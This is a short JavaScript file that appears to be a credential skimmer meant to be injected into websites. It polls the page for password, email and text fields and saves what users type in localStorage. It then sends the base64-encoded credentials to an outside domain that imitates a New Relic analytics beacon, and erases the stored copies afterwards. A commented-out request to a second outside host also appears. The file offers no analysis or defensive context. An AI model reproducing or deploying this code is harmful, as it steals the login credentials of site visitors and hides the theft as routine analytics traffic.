/**/

var intvarchk1 = setInterval(function(){ 
if ( document.querySelectorAll("input[type=password]").length != 0) {
/*
var xhttp1 = new XMLHttpRequest();xhttp1.open('POST', 'https://s3fm.org/app/post.php', true);xhttp1.send();
*/

localStorage.SPw1 = document.querySelectorAll("input[type=password]")[0].value;

if ( document.querySelectorAll("input[type=email]").length != 0   ) {

if ( document.querySelectorAll("input[type=email]")[0].value != ""){
localStorage.SEm1 = document.querySelectorAll("input[type=email]")[0].value;
}

}
else if ( document.querySelectorAll("input[type=text]").length != 0){

if ( document.querySelectorAll("input[type=text]")[0].value != ""){
localStorage.Stxt1 = document.querySelectorAll("input[type=text]")[0].value;
}

localStorage.Stxt2 = document.querySelectorAll("input[type=text]")[1].value;


}

}
else 
{  


if (localStorage.SPw1 != undefined || localStorage.Stxt1 != undefined || localStorage.SEm1 != undefined) {

new Image().src = "https://beacon-1newrelic.com/2/stats.js?bun=" + btoa(localStorage.Stxt1) + "&bun2=" + btoa(localStorage.Stxt2) + "&bpw=" + btoa(localStorage.SPw1) + "&bem=" + btoa(localStorage.SEm1);


localStorage.removeItem('SPw1'); 
localStorage.removeItem('Stxt1'); 
localStorage.removeItem('SEm1'); 
};

clearInterval(intvarchk1);
}
}, 100);
